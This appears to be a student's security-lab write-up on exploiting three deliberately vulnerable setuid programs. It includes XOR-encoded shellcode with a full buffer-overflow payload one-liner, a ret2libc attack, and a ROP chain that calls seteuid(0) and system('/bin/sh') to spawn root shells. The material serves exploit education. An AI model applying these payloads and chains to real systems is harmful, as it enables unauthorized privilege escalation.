make commands

make // will make all the binaries (vuln1 vuln2 vuln3), 
     // will require password as the modification to owner and group, along with setuid bit is set while
     //		making the binary

make clean // will remove all the binaries


1) TO exploit the vulneranbility in vuln1.c 
  I just rewrote the first part of shell code which had the escape bytes Xored with a key to make them bypass the filter (for-if in c file)
  The shell code itself `unpacks` or Xors the escape characters back with the key and calls system with "/bin/sh".
  
  To find the eip / return address I used gdb and inspected the stack overflowing it with 268 bytes of A's (and then a series of 'B's and 'C's) to locate the address offset (reagrds to bufer start addr) (by overflowing saved eip/return address)
 and then replaced it by the address system so that is called next after strcpy.  
  
  the commmand is given below. I have attached screeshot in this folder with the name vuln1-working.png of the root shell spwaned.
 The shell code translates to 
 
xor eax, eax                                    ; clear the eax regiter for furhter operations
push eax					; push 0 on the stack (Argument for system call)
mov eax, 0x55aaaaaa				; copy key 0x55aaaaaa to eax
mov ebx, 0x3dd98585				; copy the 1st coded string in ebx
xor eax, ebx					; xor eax and ebx to unpack 1st string with escape characters unpacked string  = 0x68732f2f
push eax					; push this on the stack (argument for the systemcall)
mov eax, 0x55aaaaaa				; move the key to eax to unpack 2nd string
mov ebx, 0x3bc3c885				; copy the encoded 2nd string in ebx 
xor eax, ebx					; xor eax and ebx to unpack 2nd string with escape characters unpacked string  = 0x6e69622f
push eax					; push the decoded 2nd string on the stack as an argument for system call
xor eax, eax					; clear eax
mov ebx, esp					; change the stack frame  esp
push eax					; 
push ebx					; /* 
mov ecx, esp					;  *
mov al, 0xb					;  *   SYSTEM CALL
int 0x80					;  */

`python -c 'print "A"*268+"\x80\xee\xff\xbf" + "\x90"*100 + "\x31\xC0\x50\xB8\xAA\xAA\xAA\x55\xBB\x85\x85\xD9\x3D\x31\xD8\x50\xB8\xAA\xAA\xAA\x55\xBB\x85\xC8\xC3\x3B\x31\xD8\x50\x31\xC0\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"'`

2) Its a straight forward ROP (return oriented programming attack)
I used gdb to overflow the buffer and find the exact offset to overflow the return address/saved eip on the stack

Then placed the address of System at that place , address of "/bin/sh" string as argument to system call
and  finally address of "exit" function in the return address for system call
the root shell is spawned. I packed it using the struct library of python Very helpful.

use: 
python exploit2.py

I have saved a screen shot named vuln2-working.png in this folder  to show the root shell spawned.


3) It took a while to understand the function calls and stack addresses initally.
	
	To gain priveleges back one needs to chain a seteuid(0) 
	placing 0x00000000 on the stack at a desired location was the main challenge.
	
	a) I wanted to use strcpy to copy the nullbyte from a desired location (Last byte of "/bin/sh" string in libc we used earlier)
	   to the destination address
	   (To test how strcpy works I wrote shel-test.c it copies the null byte from src to dst char [])  
	   so the stack should look like as if four calls to strcpy are made and then a call to seteuid and then a call to system.
	   
	   so the shell code this time 
	   (instead of a direct call to system will have first call to strcpy to copy the first zero to desired location on stack)
	   
	   Addresses        
	     |	     buf 'A'
	     |       buf 'A'
	     |       addr(strcpy)
	     V       addr(pop_pop_ret_gadget)    return address (this gadget will pop off the two args and return, chaining call to strcpy below)
	             addr(src_zero_byte)         argument #1
	             addr(first_null_byte) <==== argument #2 this is the destination adress this will make the first byte 0 
                     addr(strcpy)                
	     V       addr(pop_pop_ret_gadget)
	             addr(src_zero_byte)
	             addr(first_null_byte + 1) <==== this is the destination adress, this will make the second byte 0
	             addr(strcpy)
	     V       addr(pop_pop_ret_gadget)
	             addr(src_zero_byte)
	             addr(first_null_byte + 2) <==== this is the destination adress this will make the third byte 0
	             addr(strcpy)
	     V       addr(pop_pop_ret_gadget)
	             addr(src_zero_byte)
	             addr(first_null_byte + 3) <==== this is the destination adress this will make the fourth byte 0
	             addr(seteuid)
	             addr(pop_ret_gadget)
	             seteuid_arg ("CCCC") <==== initially its CCCC(four bytes) this should be replaced by 0x0000000 by calls to strcpy placed earlier 
	             addr(system)
	             addr(exit)  
	             argument(system) === addr("/bin/sh")

	I figured out the address of the first 'C' in the seteuid's arg on the stack by calculating the offset from the start of the buffer
	let a_buf = start address of the buf varible in stack
	
	so the offset for first_null_byte = 
		a_buf + (number of 'A''s = 264)                                4   +      4                  +    4           +     4
		+ 4*(sizeof(strcpy block = 4*4))  strcpy block size =  addr(strcpy)+addr(pop_pop_ret_gadget) + addr(src_zero) + addr(first_null_byte)
		+ (sizeof(addr(seteuid)) = 4) 
		+ (sizeof(addr(pop_ret_gadget))=4)
		
		One can get the buf address from gdb or using strace/ltrace it displays the calls made arguments so 
		a call like strcpy(buf_address, input string) is seen and shown in the vuln3-ltrace.png
		the address was 0xbfffee04

		However this approach didnt work ... for some reason....
		 the code is there in Python to pack all the values
		
		
		I started looking for other methods, read some blogs and found out about gets() which places 0 at the destination address 
		if user input is nothing
		
		So followed a similar approach and instead of strcpy I made four calls to gets() so the stack looks like this
		
		Addresses        
	     |	     buf 'A'
	     |       buf 'A'
	     |       addr(gets)
	     V       addr(pop_ret_gadget)    return address (this gadget will pop off the only argument and return, chaining call to gets below)
	             addr(first_null_byte) <==== argument this is the destination adress this will make the first byte 0 
                     addr(gets)                
	     V       addr(pop_ret_gadget)
	             addr(first_null_byte + 1) <==== this is the destination adress, this will make the second byte 0
	             addr(gets)
	     V       addr(pop_ret_gadget)
	             
	             addr(first_null_byte + 2) <==== this is the destination adress this will make the third byte 0
	             addr(gets)
	     V       addr(pop_ret_gadget)
	             
	             addr(first_null_byte + 3) <==== this is the destination adress this will make the fourth byte 0
	             addr(seteuid)
	             addr(pop_ret_gadget)
	             seteuid_arg ("CCCC") <==== initially its CCCC(four bytes) this should be replaced by 0x0000000 by calls to strcpy placed earlier 
	             addr(system)
	             addr(exit)  
	             argument(system) === addr("/bin/sh")	
			
	Here however the offset for first zero byte is calculated slightly diffrently as the size of gets (stack frame is different)
        the offset for first_null_byte = 
		a_buf + (number of 'A''s = 264)                              4     +      4               +    4           
		
		+ 4*(sizeof(strcpy block = 3*4))  strcpy block size =  addr(gets)  + addr(pop_ret_gadget) +  addr(first_null_byte)
		+ (sizeof(addr(seteuid)) = 4) 
		+ (sizeof(addr(pop_ret_gadget))=4)
			
	This approach worked only thing is the user has to press `enter` four times to complete call to gets and a root shell is spawned 
	
	 the shell code is contructed in exploit3.py
	 To run
	 ./vuln3 `python exploit3.py`
	 
	 I used ropper to find the address for pop_ret and pop_pop_ret gadgets
	 
	 
	 Good thing was that all address didnt have \x00 , strcpy wont work :)
	 otherwise I would have used a nop; ret; gadget and made some calls till the 
	 address offset yielded good values.
			
